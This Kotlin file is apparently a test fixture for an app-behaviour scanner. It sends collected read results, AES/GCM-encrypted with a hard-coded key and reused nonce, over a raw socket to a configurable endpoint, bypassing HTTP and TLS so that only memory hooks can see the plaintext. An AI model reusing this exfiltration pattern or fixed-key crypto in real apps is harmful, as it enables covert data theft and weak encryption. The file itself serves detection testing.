package com.vscanner.targetapp

// 仅用于授权测试（自有设备与自有 APK）。
//
// 行为 4：自绘加密外泄。把读取结果用 javax.crypto.Cipher（AES/GCM）加密后，
// 经原始 Socket 直接发送密文字节——不走 HTTP、不走 TLS，而是应用自己实现加密。
// 这是「内存 Hook 截获明文 Buffer」的靶子：明文只在进入 Cipher.doFinal 之前
// 存在于内存，一旦加密即变密文，传统抓包（Phase 4 Mitmproxy）只能看到密文；
// vehicle/hooks 的 hook_cipher.js 在加密前截获明文，hook_egress.js 记录出站连接。
//
// 密钥 / nonce 固定、nonce 前置在密文前，仅供夹具复现与接收端解密验证，
// 不代表任何真实密钥管理实践（夹具要求「一切行为可被直接观察」，不规避不混淆）。

import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket
import java.nio.charset.StandardCharsets
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread

object CipherSender {

    // 固定 16 字节 AES 密钥 + 12 字节 GCM nonce（夹具复现用，非真实密钥管理）
    private val KEY = ByteArray(16) { it.toByte() }
    private val NONCE = ByteArray(12) { (it + 1).toByte() }
    private const val GCM_TAG_BITS = 128
    private const val TIMEOUT_MS = 10_000

    fun send(endpoint: String, reads: List<ReadResult>, onDone: (String) -> Unit) {
        thread(name = "vsc-cipher") {
            onDone(doSend(endpoint, reads))
        }
    }

    private fun parseEndpoint(endpoint: String): Pair<String, Int>? {
        val idx = endpoint.lastIndexOf(':')
        if (idx <= 0) return null
        val host = endpoint.substring(0, idx)
        val port = endpoint.substring(idx + 1).toIntOrNull() ?: return null
        return host to port
    }

    private fun doSend(endpoint: String, reads: List<ReadResult>): String {
        EventLog.log("== 自绘加密外泄开始: $endpoint（${reads.size} 条读取结果，AES/GCM）==")
        return try {
            val (host, port) = parseEndpoint(endpoint)
                ?: return "PARSE_ERROR: 端点应为 host:port，实际 $endpoint"
            val plaintext = EgressSender.buildPayload(reads).toByteArray(StandardCharsets.UTF_8)
            EventLog.log("明文 payload（${plaintext.size} 字节）: ${String(plaintext, StandardCharsets.UTF_8)}")
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(KEY, "AES"), GCMParameterSpec(GCM_TAG_BITS, NONCE))
            val ciphertext = cipher.doFinal(plaintext)
            EventLog.log("加密后密文 ${ciphertext.size} 字节（明文 ${plaintext.size} 字节）")

            Socket().use { socket ->
                socket.connect(InetSocketAddress(host, port), TIMEOUT_MS)
                val out: OutputStream = socket.getOutputStream()
                out.write(NONCE)          // 前置 nonce，供接收端解密复现
                out.write(ciphertext)
                out.flush()
            }
            EventLog.log("密文已发送（nonce+密文 共 ${NONCE.size + ciphertext.size} 字节）")
            "SENT ${ciphertext.size} ciphertext bytes to $endpoint"
        } catch (t: Throwable) {
            // 连接失败不影响「加密前明文被 hook 截获」这个验证点：doFinal 先于 connect 执行。
            EventLog.log("自绘加密外泄失败: ${t.javaClass.name}: ${t.message}")
            "${t.javaClass.name}: ${t.message}"
        } finally {
            EventLog.log("== 自绘加密外泄结束 ==")
        }
    }
}
